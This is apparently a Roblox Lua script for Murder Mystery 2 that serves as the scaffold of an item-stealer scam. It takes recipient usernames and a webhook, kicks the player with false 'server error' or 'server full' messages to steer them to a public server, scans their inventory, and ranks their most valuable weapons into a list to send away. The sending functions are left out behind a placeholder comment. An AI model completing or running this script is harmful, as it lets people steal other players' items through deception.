_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if next(users) == nil or webhook == "" then
    plr:Kick("You didn't add username or webhook")
    return
end

if game.PlaceId ~= 142823291 then
    plr:Kick("Game not supported. Please join a normal MM2 server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:Kick("Server error. Please join a DIFFERENT server")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:Kick("Server is full. Please join a less populated server")
    return
end

local weaponsToSend = {}
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local HttpService = game:GetService("HttpService")

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    local response = request({Url = url, Method = "GET"})
    return response.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        return tonumber(valueStr)
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " "))
            itemName = trim((itemName:split(" Click "))[1])
            local itemNameLower = itemName:lower()
            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemNameLower] = value
            end
        end
    end
    return itemValues
end

local function buildValueList()
    local allExtractedValues = {}
    for rarity, url in pairs(categories) do
        local htmlContent = fetchHTML(url)
        if htmlContent and htmlContent ~= "" then
            local extracted = extractItems(htmlContent)
            for k, v in pairs(extracted) do
                allExtractedValues[k] = v
            end
        end
        task.wait(0.5)
    end
    return allExtractedValues
end

local valueList = buildValueList()
local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local totalValue = 0

for dataid, amount in pairs(realData.Weapons.Owned or {}) do
    local info = database[dataid]
    if info then
        local rarity = info.Rarity
        local weaponRarityIndex = table.find(rarityTable, rarity)
        local minRarityIndex = table.find(rarityTable, min_rarity)
        if weaponRarityIndex and weaponRarityIndex >= minRarityIndex then
            local value = valueList[dataid] or valueList[info.ItemName:lower()] or (weaponRarityIndex >= 5 and 2 or 1)
            if value >= min_value then
                totalValue = totalValue + (value * amount)
                table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
            end
        end
    end
end

if #weaponsToSend > 0 then
    table.sort(weaponsToSend, function(a, b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local sentWeapons = {}
    for i, v in ipairs(weaponsToSend) do
        sentWeapons[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "@everyone "
    end

    -- Your SendFirstMessage and SendMessage functions go here (add them if you want)
    print("✅ Loaded " .. #weaponsToSend .. " items | Total Value: " .. totalValue)
end
